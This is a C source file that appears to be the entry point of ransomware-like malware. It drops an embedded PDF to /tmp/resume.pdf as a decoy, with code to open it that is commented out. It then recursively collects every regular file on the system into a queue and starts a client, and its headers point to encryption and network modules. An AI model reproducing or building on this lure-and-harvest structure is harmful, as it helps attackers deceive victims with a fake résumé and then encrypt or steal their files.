#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>

#include "../../headers/encryption.h"
#include "../../headers/globals.h"
#include "../../headers/client.h"
#include "../../headers/watcher.h"
#include "../../headers/pdf_data.h"

void traverse(const char *path) {

    struct dirent *entry;
    DIR *dir = opendir(path);

    if (!dir) {
        perror("opendir");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char fullPath[1024];
        if (snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name) >= sizeof(fullPath)) {
            fprintf(stderr, "Path too long: %s/%s\n", path, entry->d_name);
            continue;
        }

        struct stat statbuf;
        if (stat(fullPath, &statbuf) == -1) {
            perror("stat");
            continue;
        }

        if (S_ISLNK(statbuf.st_mode)) {
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            printf("Directory: %s\n", fullPath);
            traverse(fullPath);  // recursive call
        } else if (S_ISREG(statbuf.st_mode)) {
            printf("File: %s\n", fullPath);
            enqueue(&queue, fullPath);
        }
    }
    closedir(dir);
}

int main() {
    // start_path ist jetzt in globals.c definiert, brauche den als global für watcher.
    const char *temp_path = "/tmp/resume.pdf";

    FILE *f = fopen(temp_path, "wb");
    if (!f) return 1;
    fwrite(sample_pdf, 1, sample_pdf_len, f);
    fclose(f);

    char cmd[256];
    snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", temp_path);
    //system(cmd); Uncomment to open the pdf.

    //RAND_bytes(key, sizeof(key));
    initializeQueue(&queue);

    traverse(start_path);

    startclient();

    return 0;
}
